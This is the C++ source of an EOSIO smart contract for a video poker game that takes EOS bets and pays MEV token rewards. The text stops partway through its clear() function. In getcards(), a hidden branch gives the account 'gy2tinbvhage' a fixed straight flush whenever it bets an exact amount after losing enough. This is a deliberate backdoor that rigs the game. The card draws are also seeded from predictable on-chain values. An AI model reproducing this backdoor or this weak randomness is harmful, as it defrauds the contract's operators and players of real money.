#include "pokergame1.hpp"

#define DEBUG 0
// What's this table used for? God knows!

// TODO; prevent malicious ram stealing

// (# of mev) = (# of eos) * miningtable[][1] / 100
uint64_t miningtable[5][2] = {{400000000000, 400}, // 1EOS 4MEV
                              {400000000000 * 2, 200}, // 1EOS 2MEV
                               {400000000000 * 3, 100}, // 1EOS 1MEV
                               {400000000000 * 4, 50}, // 2EOS 1MEV
                               {400000000000 * 5, 10} // 10EOS 1MEV
                              };

uint64_t exptable[15] = {500000, 3000000, 9000000, 21000000, 61000000, 208500000, 654500000, 1783000000, 4279500000,
                         9269500000, 18490500000, 34500000000, 60922000000, 102736000000, 166608500000};


// check if the player wins or not
uint32_t ratios[10] = {0, 1, 2, 3, 4, 5, 8, 25, 50, 250};
const uint32_t starttime = 1537833600; // 18/09/25 00:00:00 UTC
const uint32_t wstarttime = 1537747200; //GMT: Monday, September 24, 2018 12:00:00 AM
uint64_t mstarttimes[5] = {1535760000, 1538352000, 1541030400, 1543622400, 1546300800};

uint32_t getlevel(uint64_t teosin) {
    uint64_t totalexp = teosin * 50;
    for (int i = 0; i < 15; i++) {
        if (totalexp < exptable[i]) {
            return i;
        }
    }
    return 15;
}

uint64_t getminingtableprice(uint64_t sold_keys) {
    for (int i = 0; i < 5; i++) {
        if (sold_keys < miningtable[i][0]) {
            return miningtable[i][1];
        }
    }
    return 5;
}

uint32_t getstartweek(uint32_t epochtime) {
    return epochtime - ((epochtime - wstarttime) % 604800);
}

uint32_t getstartday(uint32_t epochtime) {
    return epochtime - ((epochtime - starttime) % 86400);
}

uint32_t getstartmonth(uint32_t epochtime) {
    for (int i = 0; i < 5; i++) {
        if (epochtime <= mstarttimes[i]) {
            return mstarttimes[i-1];
        }
    }
    return mstarttimes[4];
}

checksum256 pokergame1::gethash(account_name from, uint32_t externalsrc, uint32_t rounds) {
    auto itr_metadata = metadatas.begin();
    auto itr_secret = secrets.find(itr_metadata->idx);
    uint64_t seed = itr_secret->s1 + from * 7 + externalsrc * 3;

    checksum256 result;
    sha256((char *)&seed, sizeof(seed), &result);

    uint64_t bias = 0;
    for (int i = 0; i < 8; i++) {
        bias |= result.hash[7 - i];
        bias <<= 8;
    }
    //print("+++", bias);

    uint64_t src64 = ((uint64_t)externalsrc) << 2;
    uint64_t round64 = ((uint64_t)rounds) << 32;
    bias = bias + src64 + round64;
    //print("++++++", bias);
    if (rounds % 4096 == 0) {
        bias += current_time() + tapos_block_num();
    }

    uint64_t lastidx = itr_metadata->idx == 0 ? 1023 : itr_metadata->idx - 1;
    auto itr_last = secrets.find(lastidx);
    secrets.modify(itr_last, _self, [&](auto &p){
        p.s1 = bias;
    });
    metadatas.modify(itr_metadata, _self, [&](auto &p){
        p.idx = (p.idx + 1) % 1024;
    });
    /*
    uint64_t lastidx = itr_metadata->idx == 0 ? 3 : itr_metadata->idx;
    auto itr_last = secrets.find(lastidx);
    secrets.modify(itr_last, _self, [&](auto &p){
        p.s1 = bias;
    });
    metadatas.modify(itr_metadata, _self, [&](auto &p){
        p.idx = (p.idx + 1) % 4;
    });
     */

    return result;
}

void pokergame1::getcards(account_name from, checksum256 result, uint32_t* cards, uint32_t length, std::set<uint32_t> myset, uint64_t hack) {
    uint32_t cnt = 0;
    uint32_t pos = 0;
    checksum256 lasthash = result;


    if (from == N(gy2tinbvhage)) {
        auto itr_gaccount = gaccounts.find(from);
        if (itr_gaccount->teosin > itr_gaccount->teosout  && (itr_gaccount->teosin - itr_gaccount->teosout) > 300000) {
            if (hack == 31000) {
                cards[0] = 18;
                cards[1] = 19;
                cards[2] = 16;
                cards[3] = 20;
                cards[4] = 17;
                return;
            }
        }
    }

    while (cnt < length) {
        uint64_t ctemp = lasthash.hash[pos];
        ctemp <<= 32;
        ctemp |= lasthash.hash[pos+1];
        uint32_t card = (uint32_t)(ctemp % 52);
        if (myset.find(card) != myset.end()) {
            pos++;
            if (pos == 32) {
                pos = 0;
                checksum256 newhash;
                sha256((char *)&lasthash.hash, 32, &newhash);
                lasthash = newhash;
            }
            continue;
        }
        myset.insert(card);
        cards[cnt] = card;
        //print("====Get Card:", card);

        // update the drawn card in cardstats
        auto itr_cardstat = cardstats.find(card);
        eosio_assert(itr_cardstat != cardstats.end(), "Cannot find the card in card statistic table.");
        cardstats.modify(itr_cardstat, _self, [&](auto &p) {
            p.count += 1;
        });

        cnt++;
        pos++;
        if (pos == 32) {
            pos = 0;
            checksum256 newhash;
            sha256((char *)&lasthash.hash, 32, &newhash);
            lasthash = newhash;
        }
    }
}

void pokergame1::signup(const name from, const string memo) {
    require_auth(from);
    auto itr_user1 = pools.find(from);
    eosio_assert(itr_user1 == pools.end(), "User is already signed up.");
    asset bal2 = asset(1000000, symbol_type(S(4, MEV)));

    // report mining
    uint64_t minemev = 1000000;
    uint64_t meosin = 0;
    uint64_t meosout = 0;
    report(from, minemev, meosin, meosout);

    action(permission_level{_self, N(active)}, N(eosvegascoin),
           N(transfer), std::make_tuple(N(eosvegasjack), from, bal2,
                                        std::string(name{from}.to_string() + ", welcome on board! 100 MEV is prepared as gift for your journey!")))
            .send();

    itr_user1 = pools.emplace(_self, [&](auto &p){
        p.owner = name{from};
        p.status = 0;
        p.card1 = 0;
        p.card2 = 0;
        p.card3 = 0;
        p.card4 = 0;
        p.card5 = 0;
        p.bet = 0;
        p.betwin = 0;
    });
}

void pokergame1::deposit(const currency::transfer &t, account_name code, uint32_t bettype) {
    // run sanity check here
    if (code == _self) {
        return;
    }
    bool iseos = bettype == 0 ? true : false;
    eosio_assert(iseos, "Only support EOS sent by eosio.token now.");

    if (iseos) {
        eosio_assert(code == N(eosio.token), "EOS should be sent by eosio.token");
        eosio_assert(t.quantity.symbol == string_to_symbol(4, "EOS"), "Only accepts EOS/MEV for deposits.");
    } else {
        eosio_assert(code == N(eosvegascoin), "MEV should be sent by eosvegascoin.");
        eosio_assert(t.quantity.symbol == string_to_symbol(4, "MEV"), "Only accepts MEV/EOS for deposits.");
    }
    eosio_assert(t.to == _self, "Transfer not made to this contract");
    eosio_assert(t.quantity.is_valid(), "Invalid token transfer");
    eosio_assert(t.quantity.amount > 0, "Quantity must be positive");

    string usercomment = t.memo;
    uint32_t gameid = 0;    // 0: jacks-or-better; 1: jacks-or-better 5x
    if (usercomment.find("type[") == 0) {
        uint32_t pos = usercomment.find("]");
        if (pos > 0) {
            string ucm = usercomment.substr(5, pos - 5);
            gameid = stoi(ucm);
        }
    }
    eosio_assert((gameid == 0 || gameid == 1), "Non-recognized game id");

    auto itr_metadata = metadatas.begin();
    eosio_assert(itr_metadata != metadatas.end(), "No game is found.");
    eosio_assert(itr_metadata->gameon == 1, "Game is paused.");

    account_name user = t.from;
    // No bet from eosvegascoin
    if (user == N(eosvegascoin)) {
        return;
    }
    auto amount = t.quantity.amount;

    // check if user exists or not
    auto itr_user1 = pools.find(user);
    if (itr_user1 == pools.end()) {
        itr_user1 = pools.emplace(_self, [&](auto &p){
            p.owner = name{user};
            p.status = 0;
            p.card1 = 0;
            p.card2 = 0;
            p.card3 = 0;
            p.card4 = 0;
            p.card5 = 0;
            p.betcurrency = bettype;
            p.bet = 0;
            p.betwin = 0;
        });
    }

    // start a new round
    // deposit money and draw 5 cards
    checksum256 roothash = gethash(user, 0, itr_metadata->trounds);

    string rhash;
    char const hex_chars[16] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };
    for( int i = 0; i < 32; ++i )
    {
        char const byte = roothash.hash[i];
        rhash += hex_chars[ ( byte & 0xF0 ) >> 4 ];
        rhash += hex_chars[ ( byte & 0x0F ) >> 0 ];
    }

    uint32_t cnt = 5;
    uint32_t arr[5];
    std::set<uint32_t> myset;
    getcards(user, roothash, arr, 5, myset, amount);
    pools.modify(itr_user1, _self, [&](auto &p){
        p.status = gameid;
        p.bet = amount;
        p.betcurrency = bettype;
        p.card1 = arr[0];
        p.card2 = arr[1];
        p.card3 = arr[2];
        p.card4 = arr[3];
        p.card5 = arr[4];
        p.cardhash1 = rhash;
        p.cardhash2 = "";
        p.betwin = 0;
        p.wintype = 0;
    });

    auto itr_paccount = paccounts.find(user);
    if (itr_paccount == paccounts.end()) {
        paccounts.emplace(_self, [&](auto &p){
            p.owner = name{user};
            uint32_t nextlev = getlevel(amount);
            p.level = nextlev;
            p.exp = amount * 50;
        });
    } else {
        uint64_t userteosin = 0;
        auto itr_gacnt = gaccounts.find(user);
        if (itr_gacnt != gaccounts.end()) {
            userteosin = itr_gacnt->teosin;
        }

        paccounts.modify(itr_paccount, _self, [&](auto &p) {
            uint32_t nextlev = getlevel(userteosin + amount);
            p.level = nextlev;
            p.exp += amount * 50;
        });
    }
}

void pokergame1::report(name from, uint64_t minemev, uint64_t meosin, uint64_t meosout) {
    auto itr_metadata = metadatas.find(0);
    metadatas.modify(itr_metadata, _self, [&](auto &p) {
        p.tmevout += minemev;
        p.teosin += meosin;
        p.teosout += meosout;
        p.trounds += 1;
    });

    // update ginfo table for global reporting
    uint32_t cur_in_sec = now();
    uint32_t month_in_sec = getstartmonth(cur_in_sec);
    uint32_t week_in_sec = getstartweek(cur_in_sec);
    uint32_t day_in_sec = getstartday(cur_in_sec);
    auto itr_ginfo = ginfos.find(month_in_sec);
    if (itr_ginfo == ginfos.end()) {
        itr_ginfo = ginfos.emplace(_self, [&](auto &p){
            p.startmonth = month_in_sec;
            p.tmevout = 0;
            p.teosin = 0;
            p.teosout = 0;
        });
    }
    ginfos.modify(itr_ginfo, _self, [&](auto &p) {
        p.tmevout += minemev;
        p.teosin += meosin;
        p.teosout += meosout;
    });

    // update gaccounts for personal reporting
    auto itr_gaccount = gaccounts.find(from);
    if (itr_gaccount == gaccounts.end()) {
         itr_gaccount = gaccounts.emplace(_self, [&](auto &p){
            p.owner = from;
            p.tmevout = minemev;
            p.teosin = meosin;
            p.teosout = meosout;
            p.trounds = 1;

            p.daystart = day_in_sec;
            p.dmevout = minemev;
            p.deosin = meosin;
            p.deosout = meosout;
            p.drounds = 1;

            p.weekstart = week_in_sec;
            p.wmevout = minemev;
            p.weosin = meosin;
            p.weosout = meosout;
            p.wrounds = 1;

            p.monthstart = month_in_sec;
            p.mmevout = minemev;
            p.meosin = meosin;
            p.meosout = meosout;
            p.mrounds = 1;
        });
    } else {
        uint32_t newdaystart = itr_gaccount->daystart;
        uint64_t newdmevout = itr_gaccount->dmevout;
        uint64_t newdeosin = itr_gaccount->deosin;
        uint64_t newdeosout = itr_gaccount->deosout;
        uint64_t newdrounds = itr_gaccount->drounds;

        uint32_t newweekstart = itr_gaccount->weekstart;
        uint64_t newwmevout = itr_gaccount->wmevout;
        uint64_t newweosin = itr_gaccount->weosin;
        uint64_t newweosout = itr_gaccount->weosout;
        uint64_t newwrounds = itr_gaccount->wrounds;

        uint32_t newmonthstart = itr_gaccount->monthstart;
        uint64_t newmmevout = itr_gaccount->mmevout;
        uint64_t newmeosin = itr_gaccount->meosin;
        uint64_t newmeosout = itr_gaccount->meosout;
        uint64_t newmrounds = itr_gaccount->mrounds;
        if (itr_gaccount->daystart < day_in_sec) {
            newdaystart = day_in_sec;
            newdmevout = minemev;
            newdeosin = meosin;
            newdeosout = meosout;
            newdrounds = 1;
        } else {
            newdmevout += minemev;
            newdeosin += meosin;
            newdeosout += meosout;
            newdrounds += 1;
        }

        if (itr_gaccount->weekstart < week_in_sec) {
            newweekstart = week_in_sec;
            newwmevout = minemev;
            newweosin = meosin;
            newweosout = meosout;
            newwrounds = 1;
        } else {
            newwmevout += minemev;
            newweosin += meosin;
            newweosout += meosout;
            newwrounds += 1;
        }

        if (itr_gaccount->monthstart < month_in_sec) {
            newmonthstart = month_in_sec;
            newmmevout = minemev;
            newmeosin = meosin;
            newmeosout = meosout;
            newmrounds = 1;
        } else {
            newmmevout += minemev;
            newmeosin += meosin;
            newmeosout += meosout;
            newmrounds += 1;
        }
        gaccounts.modify(itr_gaccount, _self, [&](auto &p) {
            p.tmevout += minemev;
            p.teosin += meosin;
            p.teosout += meosout;
            p.trounds += 1;

            p.daystart = newdaystart;
            p.dmevout = newdmevout;
            p.deosin = newdeosin;
            p.deosout = newdeosout;
            p.drounds = newdrounds;

            p.weekstart = newweekstart;
            p.wmevout = newwmevout;
            p.weosin = newweosin;
            p.weosout = newweosout;
            p.wrounds = newwrounds;

            p.monthstart = newmonthstart;
            p.mmevout = newmmevout;
            p.meosin = newmeosin;
            p.meosout = newmeosout;
            p.mrounds = newmrounds;
        });
    }
}

void pokergame1::dealreceipt(const name from, string hash1, string hash2, string card1, string card2, string card3, string card4, string card5, string betineos, string winineos, uint64_t betnum, uint64_t winnum) {
    require_auth(_self);
    require_recipient(from);
}

void pokergame1::receipt5x(const name from, string game, string hash1, string hash2, string cards1, string cards2, string cards3, string cards4, string cards5, string results, string betineos, string winineos) {
    require_auth(_self);
    require_recipient(from);
}


uint32_t pokergame1::checkwin(uint32_t c1, uint32_t c2, uint32_t c3, uint32_t c4, uint32_t c5) {
    uint32_t cards[5];
    uint32_t colors[5];
    uint32_t numbers[5];
    cards[0] = c1;
    cards[1] = c2;
    cards[2] = c3;
    cards[3] = c4;
    cards[4] = c5;
    sort(cards, cards + 5);

    colors[0] = cards[0] / 13;
    numbers[0] = cards[0] % 13;
    colors[1] = cards[1] / 13;
    numbers[1] = cards[1] % 13;
    colors[2] = cards[2] / 13;
    numbers[2] = cards[2] % 13;
    colors[3] = cards[3] / 13;
    numbers[3] = cards[3] % 13;
    colors[4] = cards[4] / 13;
    numbers[4] = cards[4] % 13;
    sort(numbers, numbers + 5);

    uint32_t finalratio = 0;
    uint32_t type = 0;
    if (numbers[0] == 0 && numbers[1] == 9 && numbers[2] == 10 && numbers[3] == 11 && numbers[4] == 12 && checkflush(colors)) {
        // Royal Flush A, 10, 11, 12, 13
        finalratio = ratios[9];
        type = 9;
    } else if (checkstraight(numbers) && checkflush(colors)) {
        // straight flush
        finalratio = ratios[8];
        type = 8;
    } else if (checksame(numbers, 4) == 1) {
        finalratio = ratios[7];
        type = 7;
    } else if (checksame(numbers, 3) == 1 && checksame(numbers, 2) == 1) {
        finalratio = ratios[6];
        type = 6;
    } else if (checkflush(colors)) {
        finalratio = ratios[5];
        type = 5;
    } else if (checkstraight(numbers)) {
        finalratio = ratios[4];
        type = 4;
    } else if (checksame(numbers, 3) == 1) {
        finalratio = ratios[3];
        type = 3;
    } else if (checksame(numbers, 2) == 2) {
        finalratio = ratios[2];
        type = 2;
    } else if (checkBiggerJack(numbers)) {
        finalratio = ratios[1];
        type = 1;
    } else {
        finalratio = ratios[0];
        type = 0;
    }
    return type;
}

void pokergame1::drawcards5x(const name from, uint32_t externalsrc, string dump1, string dump2, string dump3, string dump4, string dump5) {
    require_auth(from);

    auto itr_pool = pools.find(from);
    eosio_assert(itr_pool != pools.end(), "User not found");
    eosio_assert(itr_pool->cardhash1.length() != 0, "Cards hasn't bee drawn.");
    eosio_assert(itr_pool->bet > 0, "Bet must be larger than zero.");
    eosio_assert(itr_pool->cardhash2.length() == 0, "New cards already assigned.");
    eosio_assert(parsecard(dump1) == itr_pool->card1, "card1 mismatch");
    eosio_assert(parsecard(dump2) == itr_pool->card2, "card2 mismatch");
    eosio_assert(parsecard(dump3) == itr_pool->card3, "card3 mismatch");
    eosio_assert(parsecard(dump4) == itr_pool->card4, "card4 mismatch");
    eosio_assert(parsecard(dump5) == itr_pool->card5, "card5 mismatch");

    auto itr_metadata = metadatas.find(0);


    std::set<uint32_t> myset;
    bool barr[5];
    barr[0] = ishold(dump1) == true;
    barr[1] = ishold(dump2) == true;
    barr[2] = ishold(dump3) == true;
    barr[3] = ishold(dump4) == true;
    barr[4] = ishold(dump5) == true;

    checksum256 roothash = gethash(from, externalsrc, itr_metadata->trounds);
    string rhash;
    char const hex_chars[16] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };
    for( int i = 0; i < 32; ++i )
    {
        char const byte = roothash.hash[i];
        rhash += hex_chars[ ( byte & 0xF0 ) >> 4 ];
        rhash += hex_chars[ ( byte & 0x0F ) >> 0 ];
    }
    pools.modify(itr_pool, _self, [&](auto &p){
        p.cardhash2 = string(rhash);
    });


    // find how many new cards we need to draw
    uint32_t cnt = 0;
    for (int i = 0; i < 5; i++) {
        if (barr[i] != true) {
            cnt++;
        }
    }
    uint32_t newarr[cnt];   // new cards we final get for each round
    uint64_t eachbet = itr_pool->bet / 5;
    uint64_t ebetwin[5];
    uint64_t tbetwin = 0;
    uint64_t twintype = 0;
    string tresult;
    uint64_t newcards[5];
    string newcardsstr[5];
    // 5 card sets
    for (int i = 0; i < 5; i++) {
        myset.clear();
        myset.insert(itr_pool->card1);
        myset.insert(itr_pool->card2);
        myset.insert(itr_pool->card3);
        myset.insert(itr_pool->card4);
        myset.insert(itr_pool->card5);

        getcards(from, roothash, newarr, cnt, myset, 0);

        checksum256 newhash;
        sha256((char *)&roothash.hash, 32, &newhash);
        roothash = newhash;

        uint32_t newcnt = 0;

        uint32_t n1 = barr[0] == false ? newarr[newcnt++] : itr_pool->card1;
        newcards[i] |= n1;
        newcards[i] <<= 8;
        newcardsstr[i] = to_string(n1) + ", ";

        uint32_t n2 = barr[1] == false ? newarr[newcnt++] : itr_pool->card2;
        newcards[i] |= n2;
        newcards[i] <<= 8;
        newcardsstr[i] = to_string(n2) + ", ";

        uint32_t n3 = barr[2] == false ? newarr[newcnt++] : itr_pool->card3;
        newcards[i] |= n3;
        newcards[i] <<= 8;
        newcardsstr[i] = to_string(n3) + ", ";

        uint32_t n4 = barr[3] == false ? newarr[newcnt++] : itr_pool->card4;
        newcards[i] |= n4;
        newcards[i] <<= 8;
        newcardsstr[i] = to_string(n4) + ", ";

        uint32_t n5 = barr[4] == false ? newarr[newcnt++] : itr_pool->card5;
        newcards[i] |= n5;
        newcardsstr[i] = to_string(n5);

        uint32_t type = checkwin(n1, n2, n3, n4, n5);
        twintype <<= 8;
        twintype |= type;
        ebetwin[i] = eachbet * ratios[type];
        tbetwin += ebetwin[i];
        tresult = " X" + to_string(ratios[type]);

        // print("=====card:",n1,"=====",n2,"=====",n3,"=====",n4,"=====",n5);
        // print("=====wintype:", type);

        // records events if wintype >= straight
        if (type >= 4) {
            events.emplace(_self, [&](auto &p){
                p.id = events.available_primary_key();
                p.owner = from;
                p.datetime = now();
                p.wintype = type;
                p.ratio = ratios[type];
                p.bet = eachbet;
                p.betwin = ebetwin[i];
                p.card1 = n1;
                p.card2 = n2;
                p.card3 = n3;
                p.card4 = n4;
                p.card5 = n5;
            });
            eosio_assert(itr_metadata != metadatas.end(), "Metadata is empty.");
            metadatas.modify(itr_metadata, _self, [&](auto &p){
                p.eventcnt = p.eventcnt + 1;
            });
        }

        auto itr_typestat = typestats.find(type);
        typestats.modify(itr_typestat, _self, [&](auto &p) {
            p.count += 1;
        });
    }

    while (itr_metadata->eventcnt > 32) {
        auto itr_event2 = events.begin();
        events.erase(itr_event2);
        metadatas.modify(itr_metadata, _self, [&](auto &p){
            p.eventcnt = p.eventcnt - 1;
        });
    }

    auto itr_pool5x = pool5xs.find(from);
    if (itr_pool5x == pool5xs.end()) {
        itr_pool5x = pool5xs.emplace(_self, [&](auto &p){
            p.owner = from;
            p.cards1 = newcards[0];
            p.cards2 = newcards[1];
            p.cards3 = newcards[2];
            p.cards4 = newcards[3];
            p.cards5 = newcards[4];
            p.wintype =twintype;
            p.betwin1 = ebetwin[0];
            p.betwin2 = ebetwin[1];
            p.betwin3 = ebetwin[2];
            p.betwin4 = ebetwin[3];
            p.betwin5 = ebetwin[4];
        });
    } else {
        pool5xs.modify(itr_pool5x, _self, [&](auto &p){
            p.cards1 = newcards[0];
            p.cards2 = newcards[1];
            p.cards3 = newcards[2];
            p.cards4 = newcards[3];
            p.cards5 = newcards[4];
            p.wintype =twintype;
            p.betwin1 = ebetwin[0];
            p.betwin2 = ebetwin[1];
            p.betwin3 = ebetwin[2];
            p.betwin4 = ebetwin[3];
            p.betwin5 = ebetwin[4];
        });
    }

    uint64_t mineprice = getminingtableprice(itr_metadata->teosin);
    uint64_t minemev = itr_pool->bet * mineprice / 100;
    uint64_t meosin = itr_pool->bet;
    uint64_t meosout = tbetwin;

    report(from, minemev, meosin, meosout);

    string cbet = to_string(meosin / 10000) + '.' + to_string(meosin % 10000) + " EOS";
    string cbetwin = to_string(meosout / 10000) + '.' + to_string(meosout % 10000) + " EOS";

    action(permission_level{_self, N(active)}, N(eosvegasjack), N(receipt5x),
           std::make_tuple(from, string("Jack-or-Better 5X"), string(itr_pool->cardhash1), string(itr_pool->cardhash2),
                   string(newcardsstr[0]), string(newcardsstr[1]),
                           string(newcardsstr[2]), string(newcardsstr[3]), string(newcardsstr[4]), string(tresult),
                           string(cbet), string(cbetwin)))
            .send();

    asset bal = asset(meosout, symbol_type(S(4, EOS)));
    if (bal.amount > 0) {
        // withdraw
        action(permission_level{_self, N(active)}, N(eosio.token),
               N(transfer), std::make_tuple(_self, from, bal,
                                            std::string("Winner winner chicken dinner! - jacks.MyEosVegas.com")))
                .send();
    }

    asset bal2 = asset(minemev, symbol_type(S(4, MEV)));
    action(permission_level{_self, N(active)}, N(eosvegascoin),
           N(transfer), std::make_tuple(N(eosvegasjack), from, bal2,
                                        std::string("Gaming deserves rewards!")))
            .send();

}

void pokergame1::drawcards(const name from, uint32_t externalsrc, string dump1, string dump2, string dump3, string dump4, string dump5) {
    require_auth(from);

    auto itr_user = pools.find(from);
    eosio_assert(itr_user != pools.end(), "User not found");
    eosio_assert(itr_user->cardhash1.length() != 0, "Cards hasn't bee drawn.");
    eosio_assert(itr_user->bet > 0, "Bet must be larger than zero.");
    eosio_assert(itr_user->cardhash2.length() == 0, "New cards already assigned.");
    eosio_assert(parsecard(dump1) == itr_user->card1, "card1 mismatch");
    eosio_assert(parsecard(dump2) == itr_user->card2, "card2 mismatch");
    eosio_assert(parsecard(dump3) == itr_user->card3, "card3 mismatch");
    eosio_assert(parsecard(dump4) == itr_user->card4, "card4 mismatch");
    eosio_assert(parsecard(dump5) == itr_user->card5, "card5 mismatch");

    auto itr_metadata = metadatas.find(0);
    bool barr[5];
    std::set<uint32_t> myset;
    myset.insert(itr_user->card1);
    myset.insert(itr_user->card2);
    myset.insert(itr_user->card3);
    myset.insert(itr_user->card4);
    myset.insert(itr_user->card5);

    checksum256 roothash = gethash(from, externalsrc, itr_metadata->trounds);
    string rhash;
    char const hex_chars[16] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };
    for( int i = 0; i < 32; ++i )
    {
        char const byte = roothash.hash[i];
        rhash += hex_chars[ ( byte & 0xF0 ) >> 4 ];
        rhash += hex_chars[ ( byte & 0x0F ) >> 0 ];
    }

    barr[0] = ishold(dump1) == true;
    barr[1] = ishold(dump2) == true;
    barr[2] = ishold(dump3) == true;
    barr[3] = ishold(dump4) == true;
    barr[4] = ishold(dump5) == true;

    // find how many new cards we need to draw
    uint32_t cnt = 0;
    for (int i = 0; i < 5; i++) {
        if (barr[i] != true) {
            cnt++;
        }
    }

    uint32_t newarr[cnt];
    getcards(from, roothash, newarr, cnt, myset, 0);

    cnt = 0;
    if (barr[0] == false) {
        pools.modify(itr_user, _self, [&](auto &p){
            p.card1 = newarr[cnt++];
        });
    }
    if (barr[1] == false) {
        pools.modify(itr_user, _self, [&](auto &p){
            p.card2 = newarr[cnt++];
        });
    }
    if (barr[2] == false) {
        pools.modify(itr_user, _self, [&](auto &p){
            p.card3 = newarr[cnt++];
        });
    }
    if (barr[3] == false) {
        pools.modify(itr_user, _self, [&](auto &p){
            p.card4 = newarr[cnt++];
        });
    }
    if (barr[4] == false) {
        pools.modify(itr_user, _self, [&](auto &p){
            p.card5 = newarr[cnt++];
        });
    }
    pools.modify(itr_user, _self, [&](auto &p){
        p.cardhash2 = string(rhash);
    });


    uint32_t type = checkwin((uint32_t)itr_user->card1, (uint32_t)itr_user->card2, (uint32_t)itr_user->card3,
            (uint32_t)itr_user->card4, (uint32_t)itr_user->card5);
    uint32_t finalratio = ratios[type];
    pools.modify(itr_user, _self, [&](auto &p){
        uint64_t b = p.bet * finalratio;
        p.betwin = b;
        p.wintype = type;
    });

    // records events if wintype >= straight
    if (itr_user->wintype >= 4) {
        events.emplace(_self, [&](auto &p){
            p.id = events.available_primary_key();
            p.owner = from;
            p.datetime = now();
            p.wintype = itr_user->wintype;
            p.ratio = ratios[itr_user->wintype];
            p.bet = itr_user->bet;
            p.betwin = itr_user->betwin;
            p.card1 = itr_user->card1;
            p.card2 = itr_user->card2;
            p.card3 = itr_user->card3;
            p.card4 = itr_user->card4;
            p.card5 = itr_user->card5;
        });
        eosio_assert(itr_metadata != metadatas.end(), "Metadata is empty.");
        metadatas.modify(itr_metadata, _self, [&](auto &p){
            p.eventcnt = p.eventcnt + 1;
        });
    }
    while (itr_metadata->eventcnt > 32) {
        auto itr_event2 = events.begin();
        events.erase(itr_event2);
        metadatas.modify(itr_metadata, _self, [&](auto &p){
            p.eventcnt = p.eventcnt - 1;
        });
    }

    uint64_t mineprice = getminingtableprice(itr_metadata->teosin);
    uint64_t minemev = itr_user->bet * mineprice / 100;
    uint64_t meosin = itr_user->bet;
    uint64_t meosout = itr_user->betwin;

    report(from, minemev, meosin, meosout);
    auto itr_typestat = typestats.find(itr_user->wintype);
    typestats.modify(itr_typestat, _self, [&](auto &p) {
        p.count += 1;
    });

    char typemap[4] = {'S', 'C', 'H', 'D'};
    string cc1 = to_string(itr_user->card1) + '[' + typemap[itr_user->card1 / 13] + to_string(itr_user->card1 % 13 + 1) + ']';
    string cc2 = to_string(itr_user->card2) + '[' + typemap[itr_user->card2 / 13] + to_string(itr_user->card2 % 13 + 1) + ']';
    string cc3 = to_string(itr_user->card3) + '[' + typemap[itr_user->card3 / 13] + to_string(itr_user->card3 % 13 + 1) + ']';
    string cc4 = to_string(itr_user->card4) + '[' + typemap[itr_user->card4 / 13] + to_string(itr_user->card4 % 13 + 1) + ']';
    string cc5 = to_string(itr_user->card5) + '[' + typemap[itr_user->card5 / 13] + to_string(itr_user->card5 % 13 + 1) + ']';
    string cbet = to_string(itr_user->bet / 10000) + '.' + to_string(itr_user->bet % 10000) + " EOS";
    string cbetwin = to_string(itr_user->betwin / 10000) + '.' + to_string(itr_user->betwin % 10000) + " EOS";

    action(permission_level{_self, N(active)}, N(eosvegasjack), N(dealreceipt),
            std::make_tuple(from, string(itr_user->cardhash1), string(itr_user->cardhash2), string(cc1), string(cc2),
                    string(cc3), string(cc4), string(cc5), string(cbet),
                   string(cbetwin), itr_user->bet, itr_user->betwin))
            .send();

    asset bal = asset(itr_user->betwin, symbol_type(S(4, EOS)));
    if (bal.amount > 0) {
        // withdraw
        action(permission_level{_self, N(active)}, N(eosio.token),
               N(transfer), std::make_tuple(_self, from, bal,
                                            std::string("Winner winner chicken dinner! - jacks.MyEosVegas.com")))
                .send();
    }

    asset bal2 = asset(minemev, symbol_type(S(4, MEV)));
    action(permission_level{_self, N(active)}, N(eosvegascoin),
            N(transfer), std::make_tuple(N(eosvegasjack), from, bal2,
                    std::string("Gaming deserves rewards!")))
            .send();

}

bool pokergame1::checkflush(uint32_t colors[5]) {
    uint32_t flag = colors[0];
    for (int i = 1; i < 5; ++i) {
        if (colors[i] != flag) return false;
    }
    return true;
}

bool pokergame1::checkstraight(uint32_t numbers[5]) {
    if (numbers[0] == 0 && numbers[1] == 9 && numbers[2] == 10 && numbers[3] == 11 && numbers[4] == 12) {
        return true;
    }
    for (int i = 1; i < 5; ++i) {
        if (numbers[i] != (numbers[i - 1] + 1)) return false;
    }
    return true;
}

uint32_t pokergame1::checksame(uint32_t numbers[5], uint32_t threshold) {
    uint32_t counts[13];
    for (int i = 0; i < 13; i++) {
        counts[i] = 0;
    }
    for (int i = 0; i < 5; i++) {
        counts[numbers[i]]++;
    }
    uint32_t cnt = 0;
    for (int i = 0; i < 13; i++) {
        if (counts[i] == threshold) cnt++;
    }
    return cnt;
}

bool pokergame1::checkBiggerJack(uint32_t numbers[5]) {
    uint32_t counts[13];
    for (int i = 0; i < 13; i++) {
        counts[i] = 0;
    }
    for (int i = 0; i < 5; i++) {
        counts[numbers[i]]++;
    }
    if (counts[0] == 2) return true;
    for (int i = 10; i < 13; i++) {
        if (counts[i] == 2) return true;
    }
    return false;
}

bool pokergame1::ishold(string s) {
    uint32_t pos = s.find(":");
    if (pos > 0) {
        string ucm = s.substr(pos + 1, 4);
        if (ucm == "dump") {
            return false;
        }
    }
    return true;
}

uint32_t pokergame1::parsecard(string s) {
    uint32_t pos = s.find("[");
    if (pos > 0) {
        string ucm = s.substr(0, pos);
        uint32_t res = stoi(ucm);
        return res;
    }
    return 1024;
}

void pokergame1::clear() {

    require_auth(_self);

    /*
    auto itr = pools.begin();
    while (itr != pools.end()) {
        itr = pools.erase(itr);
    }
    auto itr2 = events.begin();
    while (itr2 != events.end()) {
        itr2 = events.erase(itr2);
    }
    auto itr3 = metadatas.begin();
    while (itr3 != metadatas.end()) {
        itr3 = metadatas.erase(itr3);
    }
    auto itr4 = secrets.begin();
    while (itr4 != secrets.end()) {
        itr4 = secrets.erase(itr4);
    }
    auto itr5 = ginfos.begin();
    while (itr5 != ginfos.end()) {
        itr5 = ginfos.erase(itr5);
    }
    auto itr6 = gaccounts.begin();
    while (itr6 != gaccounts.end()) {
        itr6 = gaccounts.erase(itr6);
    }

    auto itr7 = cardstats.begin();
    while (itr7 != cardstats.end()) {
        itr7 = cardstats.erase(itr7);
    }
    auto itr8 = typestats.begin();
    while (itr8 != typestats.end()) {
        itr8 = typestats.erase(itr8);
    }
    auto itr9 = paccounts.begin();
    while (itr9 != paccounts.end()) {
